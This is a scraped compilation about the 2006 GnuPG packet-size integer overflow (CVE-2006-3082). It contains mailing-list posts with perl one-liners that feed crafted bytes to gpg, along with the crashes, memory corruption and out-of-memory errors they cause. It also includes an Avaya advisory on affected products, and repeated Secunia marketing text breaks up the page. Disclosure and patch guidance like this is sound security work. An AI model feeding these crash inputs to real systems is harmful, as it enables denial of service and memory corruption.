Something wrapping around?

$ perl -e 'print "\xcd\xff\xff\xff\xff\xaf"'|gpg --no-armor
gpg: out of  memory while allocating 4294967295 bytes

$ perl -e 'print "\xcd\xff\xff\xff\xff\xb0"'|gpg --no-armor

gpg: Segmentation fault caught ... exiting

4294967295 is 0xffffffff, of course.

Also works with gpg2 (v.1.9.20)

Cheers
Steffen.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

gnupg security update (RHSA-2006-0571)

Original Release Date: August 18, 2006

Last Revised: December 5, 2007

Number: ASA-2006-167

Risk Level: Medium

Advisory Version: 3.0

Advisory Status: Final

---

## 1. Overview:

GnuPG is the GNU project's complete and free implementation of the OpenPGP
standard as defined by RFC2440

The GNU Privacy Guard (GPG) was found to contain an integer overflow flaw as
a result of handling large packet sizes. Using a specially crafted message,
a malicious user could cause GPG to crash and/or overwrite space in memory
when processing the large packets. The Common Vulnerabilities and Exposures
project (cve.mitre.org) has assigned the name
[CVE-2006-3082](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3082) to this issue.

The Avaya S87XX/S8500/S8300 Media Gateway products are listed with a Medium
risk impact as GPG is called by backup scripts that can be called with
elevated privileges via the sudo command.

More information about these vulnerabilities can be found in the security
advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2006-0571.html>

## 2. Avaya System Products with gnupg installed:

| Product: | Affected Version(s): | Risk Level: | Actions: |
| --- | --- | --- | --- |
| Avaya S87XX/S8500/S8300 | All versions of CM prior to CM 3.1.4 | Medium | Upgrade to CM 3.1.4 or later releases. |
| Avaya Intuity LX | All version of IALX prior to IALX 2.0 | Low | Upgrade to IALX 2.0 or later releases. |
| Avaya Messaging Storage Server | All version of MSS prior to MSS 3.1 | Low | Upgrade to MSS 3.1 or later releases. |
| Avaya Message Networking | All version of MN prior to MN 3.1 | Low | Upgrade to MN 3.1 or later releases. |
| Avaya CCS/SES | 3.1.1 | Low | Upgrade to SES 4.0 or later releases. |

**Recommended Actions:**
For all system products which use vulnerable
versions of GPG, Avaya recommends that customers restrict local and network
access to the server. This restriction should be enforced through the use of
physical security, firewalls, ACLs, VPNs, and other generally-accepted
networking practices until such time as an update becomes available and can
be installed.

## 3. Avaya Software-Only Products

Avaya software-only products operate on general-purpose operating systems.
Occasionally vulnerabilities may be discovered in the underlying operating
system or applications that come with the operating system. These
vulnerabilities often do not impact the software-only product directly but
may threaten the integrity of the underlying platform.

In the case of this advisory Avaya software-only products are not affected by
the vulnerability directly but the underlying Linux platform may be.
Customers should determine on which Linux operating system the product was
installed and then follow that vendors guidance:

## 4. Software-Only Products:

| Product: | Affected Version(s): | Risk Level: | Actions: |
| --- | --- | --- | --- |
| Avaya Interactive Response(IR) | All | None | Depending on the Operating System provided by customers, the affected packages may be installed on the underlying Operating System supporting the IR application. The IR application does not require the software described in this advisory. |
| CVLAN | All | None | Depending on the Operating System provided by customers, the affected packages may be installed on the underlying Operating System supporting the CVLAN application. The CVLAN application does not require the software described in this advisory. |
| Avaya Integrated Management Suite(IMS) | All | None | Depending on the Operating System provided by customers, the affected packages may be installed on the underlying Operating System supporting the IMS application. The IMS application does not require the software described in this advisory. |

**Recommended Actions:**
Avaya recommends that customers follow
recommended actions supplied by the Operating System vendor (e.g. RedHat
Linux) or remove the affected packages.

## 5. Additional Information:

Additional information may also be available via the Avaya support
[website](http://support.avaya.com) and through your Avaya account
representative. Please contact your Avaya product support representative, or
dial 1-800-242-2121, with any questions.

AFFILIATES (HEREINAFTER COLLECTIVELY REFERRED TO AS "AVAYA"), DISCLAIMS ALL

SHALL AVAYA BE LIABLE FOR ANY DAMAGES WHATSOEVER ARISING OUT OF OR IN

PER EXISTING AGREEMENTS WITH AVAYA.

V 2.0 - September 6, 2006 - Updated Overview to indicate why Avaya
S87XX/S8500/S8300 Media Gateways have a higher Risk Level than the rest of

# RE: GnuPG fun

```
Evgeny,

Yes this and variations of it produce some interesting output (AMD64
Gentoo)

$ perl -e 'print "\xcd\x7f\x7f\x7f\x7f\xfe"'| gpg --no-armor
gpg: orphaned user ID
$

This will proceed to eat all available CPU and memory until it dies
(approx 1-2 minutes later)

$perl -e 'print "\xcd\xff\x7f\x7f\x7f\x7f"'| gpg --no-armor
gpg: orphaned user ID

Memory Error: memory at 0x2aaaabb99018 corrupted (overflow=55)
Aborted
$

which is probably related to this

$perl -e 'print "\xcd\xff\xff\x7f\x7f\xfe"'| gpg --no-armor
gpg: out of  memory while allocating 4286546022 bytes
$

Chris

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
